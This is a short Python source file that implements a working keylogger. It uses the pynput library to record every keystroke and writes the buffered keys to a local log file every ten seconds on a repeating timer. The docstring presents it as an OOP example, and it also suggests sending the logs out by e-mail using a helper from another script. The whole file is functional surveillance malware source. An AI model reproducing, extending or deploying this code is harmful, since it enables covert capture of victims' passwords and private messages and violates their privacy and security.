#!/usr/bin/env python3
'''
A keylogger application that logs the keystrokes.
This is also an example of using OOP.
Keystrokes are stored into a file called "logfile.txt", but reporting can of course be adjusted (for example by e-mail using send_mail function from execute_and_report.py).

Evgeni Semenov, hello@safemail.sbs
'''

import pynput.keyboard
import threading

class Keylogger:
    def __init__(self, time_interval):
        self.log = "\n[+] Keylogger started:\n" # initial log value
        self.interval = time_interval

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def write_to_log_file(self, log):
        file = open("logfile.txt", "a")
        file.write(log)
        file.close

    def report(self):
        if self.log != "": #if the log is still empty, will do nothing
            self.write_to_log_file(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

if __name__ == "__main__":
    my_keylogger = Keylogger(10) # creating a new Keylogger object and passing the time interval of 10 seconds
    my_keylogger.start()
